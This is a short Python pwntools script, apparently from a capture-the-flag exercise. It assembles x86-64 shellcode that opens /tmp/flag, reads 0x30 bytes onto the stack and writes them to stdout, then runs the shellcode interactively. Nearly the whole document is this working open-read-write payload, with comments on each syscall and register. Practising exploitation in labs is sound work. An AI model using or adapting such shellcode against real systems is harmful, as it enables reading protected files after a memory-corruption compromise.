from pwn import *

context.arch = 'amd64'

code = ""
code += "push 0x67\n"
code += "mov rax, 0x616c662f706d742f\n"
code += "push rax\n"
code += "mov rdi, rsp	# rdi-> '/tmp/flag'\n"
code += "xor rsi, rsi	# rsi = 0	; RD_ONLY\n"
code += "xor rdx, rdx	# rdx = 0	; (NULL)\n"
code += "mov rax, 0x02	# rax = 2	; syscall_open\n"
code += "syscall	    # open('/tmp/flag',RD_ONLY,NULL) = open(rdi, rsi, rdx)\n"
code += "\n"
code += "mov rdi, rax	# rdi = fd	;may be 3??\n"
code += "mov rsi, rsp	# rsp -> '/tmp/flag'\n"
code += "sub rsi, 0x30	# rsi = rsp-0x30	; buf\n"
code += "mov rdx, 0x30	# rdx = 0x30	; len\n"
code += "mov rax, 0x00	# rax = 0	; syscall_read\n"
code += "syscall		# read(fd, buf, 0x30) = read(rdi, rsi, rdx)\n"
code += "\n"
code += "mov rdi, 0x01	# rdi =1	; fd = stdout\n"
code += "mov rax, 0x01	# rax = 1	; syscall_write\n"
code += "syscall		# write(fd, buf, 0x30)\n"

print(code)
print(asm(code))
print(len(asm(code)))

run_shellcode(asm(code)).interactive()
